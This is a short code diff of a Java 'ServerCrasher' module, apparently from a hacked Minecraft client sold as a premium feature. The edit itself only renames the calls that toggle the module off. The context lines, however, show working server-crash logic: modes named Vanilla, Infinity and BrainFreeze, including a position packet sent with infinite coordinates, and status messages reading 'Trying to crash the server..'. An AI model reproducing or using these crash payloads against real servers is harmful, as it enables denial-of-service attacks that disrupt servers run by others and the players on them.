@@ -30,7 +30,7 @@ public class ServerCrasher extends PremiumModule {
     private void method16482(TickEvent var1) {
         if (this.isEnabled()) {
             if (mc.isSingleplayer()) {
-                this.toggle();
+                this.method16000();
             } else {
                 String var4 = this.getStringSettingValueByName("Mode");
                 switch (var4) {
@@ -47,7 +47,7 @@ public class ServerCrasher extends PremiumModule {
                         }
 
                         Class8906.method32487("Trying to crash the server..");
-                        this.toggle();
+                        this.method16000();
                         break;
                     case "Vanilla":
                         if (this.field23695++ >= 10) {
@@ -89,12 +89,12 @@ public class ServerCrasher extends PremiumModule {
                             }
                         }
 
-                        this.toggle();
+                        this.method16000();
                         break;
                     case "Infinity":
                         mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                         Class8906.method32487("Trying to crash the server..");
-                        this.toggle();
+                        this.method16000();
                         break;
                     case "BrainFreeze":
                         mc.getConnection()
@@ -116,7 +116,7 @@ public class ServerCrasher extends PremiumModule {
                                         )
                                 );
                         if (this.field23695++ >= 200) {
-                            this.toggle();
+                            this.method16000();
                             Class8906.method32487("Trying to crash the server..");
                         }
                 }
